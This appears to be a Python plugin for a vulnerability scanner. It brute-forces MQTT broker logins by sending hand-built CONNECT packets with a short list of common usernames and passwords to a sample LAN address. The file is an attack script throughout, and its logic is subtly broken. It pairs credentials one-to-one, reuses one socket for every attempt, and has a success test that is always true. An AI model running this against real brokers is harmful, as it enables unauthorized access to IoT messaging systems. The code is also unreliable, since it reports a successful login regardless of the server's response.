#!/bin/env python3
import struct
import socket
import json
from concurrent import futures
import itertools   

vulinfo = {
    'title': 'mqtt协议弱密码爆破',  # poc插件标题（漏洞标题）
    'is_code': 0,  # 1 代表这个插件，需要自己写检测代码；0，代表这个插件是个发包类型，只需要制定发包，回包匹配正则即可
    'vul_type': '',  # 漏洞类型
    'risk_level': 3,  # 1：低危, 2：中危, 3：高危, 4:严重
    'cve_id': '',
    'cnnvd_id': '',
    'desc':
        '''
        漏洞描述说明
        MQTT服务器默认允许匿名登录,在配置简单的账号密码的情况下,用常见的账号密码字典爆破,可直接登录向Broker中任意Topic发送或订阅消息,造成mqtt服务器和其他终端极大的不安全性
        ''',
    'solution':
        '''
        漏洞修复建议
        ''',
    'references': [
        ''
    ],  # 参考链接
}


username = ['admin','root','test','guest','mqtt']
password = ['123456','password','qwerty','88888888','admin']

def run(args):
    ip = args.get('ip')
    port = args.get('port')
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, port))

    def payloads(username,password):
        payload = b'\x00\x04MQTT\x04\xc0\x00\t\x00\x06client' + struct.pack('>H', len(username)) + username.encode() + struct.pack('>H', len(password)) + password.encode()
        payload = b'\x10' + struct.pack('>B', len(payload)) + payload
        s.send(payload)
        print(f'payload = {payload}')

    with futures.ThreadPoolExecutor(max_workers=5) as pools:
        task = pools.map(payloads,['admin','root','test','guest','mqtt'],['123456','password','qwerty','88888888','admin'])
    ret = s.recv(1024)
    print(f'resp data = {ret}')

    if ret == b' \x02\x01\x00' or b'\x02\x00\x00':
        print("login success!")

if __name__ == '__main__':
    
    vul_target = {
        'ip': "192.168.1.223",
        'vul_id': 1,
        'port': 1883
    }

    run(vul_target)
    # login(host, port, username, password)